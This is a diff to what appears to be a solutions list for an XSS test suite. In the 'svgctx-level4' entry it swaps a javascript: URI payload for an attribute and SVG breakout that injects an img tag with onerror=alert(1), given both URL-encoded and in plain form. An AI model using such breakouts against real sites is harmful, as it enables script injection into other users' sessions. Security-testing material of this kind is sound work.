@@ -25,10 +25,10 @@ Reflection inside SVG sub-elements (text/desc/title/xlink:href/foreignObject/ani
 
 ### svgctx-level4
 
-`/svgctx/level4/?query=javascript:alert(1)`
+`/svgctx/level4/?query=x%22%3E%3C/a%3E%3C/svg%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: query inside `xlink:href="..."` of `<a>` — javascript: URI
+- payload: `x"></a></svg><img src=x onerror=alert(1)>`
+- context: SVG anchor xlink:href; javascript: is not followed, so break out of the attribute and svg
 
 ### svgctx-level5
 
